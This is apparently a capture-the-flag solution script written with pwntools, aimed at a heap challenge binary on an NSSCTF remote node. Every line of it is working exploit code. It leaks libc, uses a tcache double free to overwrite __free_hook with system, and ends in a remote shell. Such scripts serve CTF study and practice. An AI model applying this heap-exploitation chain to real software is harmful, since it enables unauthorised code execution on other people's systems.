from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn1")
io=remote("node5.anna.nssctf.cn",28030)
elf=ELF("./pwn1")
libc=ELF("./libc-2.27.so")

def add(s,c1,c2):
    io.sendlineafter(b"choice:",b"1")
    io.sendlineafter(b"name\n",str(s))
    io.sendafter(b"name:\n",c1)
    io.sendafter(b"call:\n",c2)

def show(n):
    io.sendlineafter(b"choice:",b"2")
    io.sendlineafter(b"index:\n",str(n))
    
def delete(n):
    io.sendlineafter(b"choice:",b"3")
    io.sendlineafter(b"index:\n",str(n))
    
# gdb.attach(io)
# pause()

add(0x410,b"a",b"/bin/sh")
add(0x20,b"gap1",b"/bin/sh")

delete(0)
show(0)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x3ebca0
print("leak_addr:",hex(leak_addr))

free_hook=leak_addr+libc.sym[b"__free_hook"]
sys_addr=leak_addr+libc.sym[b"system"]

add(0x70,b"/bin/sh",b"/bin/sh")
add(0x70,b"/bin/sh",b"/bin/sh")
add(0x70,b"/bin/sh",b"/bin/sh")

delete(2)
delete(3)
delete(2)

add(0x70,p64(free_hook),b"aaa")
add(0x70,b"aaa",b"aaa")
add(0x70,b"aaa",b"aaa")
add(0x70,p64(sys_addr),b"aaa")

delete(4)
# 0x7ffff7bebca0
# 0x7f4f09863ca0

io.interactive()